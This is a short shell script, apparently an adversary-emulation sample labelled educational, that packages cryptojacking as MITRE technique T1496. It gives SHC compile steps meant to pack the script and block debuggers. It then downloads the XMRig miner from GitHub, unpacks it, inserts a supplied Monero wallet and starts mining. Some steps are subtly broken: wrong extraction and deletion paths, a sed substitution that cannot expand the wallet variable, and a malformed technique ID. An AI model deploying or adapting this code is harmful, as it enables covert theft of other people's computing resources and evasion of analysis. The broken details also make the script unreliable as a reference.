#!/bin/sh

echo "Implementing T1496 using SHC…"
echo "============================="
echo "This Bash script is used for educational purposes."

echo "Compile instructions (SHC is required to be run):"
echo "\$ shc -r -v -f t1496-bobominer.sh -o bobominer"

echo "Releasing payload:"
echo "\$ ./bobominer <XMR_ADDRESS>"

echo "Implemented TTPs:"
echo "  - TA0002 Execution | T059.003: Command and Scripting Interpreter: Unix Shell considering that SHC payloads to be run still need a shell to be identified in the system and that the code inside the payload is, in fact, a shell script."
echo "  - TA0005 Defense Evasion | T1027.002: Obfuscated Files or Information: Software Packing by compiling malicious shell payload using SHC."
echo "  - TA0005 Defense Evasion | T1622: Debugger Evasion by compiling malicious shell payload using SHC and the parameter '-r'."
echo "  - TA0011 Command & Control | T1105 Ingress Tool Transfer by downloading additional payloads from Github."
echo "  - TA0012 Impact | T1496: Resource Hijacking by means of download of XMRig official miner from Github."

echo "References:"
echo "  [1] AhnLab (2023). \"Shc Linux Malware Installing CoinMiner\". Available online at: https://asec.ahnlab.com/en/45182/"

if [ $# -eq 0 ]
  then
    echo "No XMR mining address provided. Run it again using: ./bobominer <XMR_ADDRESS>"
    exit 13
fi

echo "1. Download the official miner from Github…"
wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O /tmp/miner.tar.gz
echo "2. Untar the file…"
tar xvfz /tmp/miner.tar.gz
echo "3. Remove the miner.tar.gz file…"
rm miner.tar.gz
echo "4. Changing permissions…"
chmod +x /tmp/xmrig-6.18.1/xmrig
echo "5. Replacing the wallet address in the default config.json file for the one passed by parameters. Wallet address: $1"
sed -i 's/YOUR_WALLET_ADDRESS/$1/g' /tmp/xmrig-6.18.1/config.json 
echo "6. Starting the miner…"
/tmp/xmrig-6.18.1/xmrig


